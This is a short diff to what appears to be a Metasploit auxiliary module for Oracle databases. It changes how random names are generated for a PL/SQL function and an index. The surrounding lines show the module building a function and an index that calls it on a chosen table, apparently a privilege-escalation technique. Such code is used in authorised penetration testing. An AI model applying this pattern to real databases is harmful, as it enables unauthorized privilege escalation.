@@ -35,8 +35,7 @@ class MetasploitModule < Msf::Auxiliary
   def run
     return unless check_dependencies
 
-    randomizer = Rex::Text.rand_text_alpha(6..12)
-    func_name = "#{randomizer}" + Rex::Text.rand_text_alpha(2..6)
+    func_name = Rex::Text.rand_text_alpha(6..10)
 
     create_function = "
       CREATE OR REPLACE FUNCTION #{func_name}
@@ -50,8 +49,9 @@ class MetasploitModule < Msf::Auxiliary
       end;
       "
 
-    index_name = "#{randomizer}" + Rex::Text.rand_text_alpha(2..6)
+    index_name = Rex::Text.rand_text_alpha(6..10)
     param_value = Rex::Text.rand_text_alpha(2..6)
+
     create_index = "
       CREATE INDEX #{index_name} ON
       #{datastore['TABLE']}(#{datastore['DBUSER']}.#{func_name}('#{param_value}'))"
